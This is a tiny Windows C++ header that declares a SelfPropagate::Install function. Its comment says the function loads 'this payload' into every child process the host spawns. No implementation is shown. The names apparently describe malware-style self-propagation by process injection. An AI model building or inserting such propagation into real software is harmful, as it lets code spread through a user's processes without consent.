#pragma once

#include <windows.h>

// Loads this payload into every child process the host spawns.
namespace SelfPropagate {
    void Install(HMODULE hSelf);
}
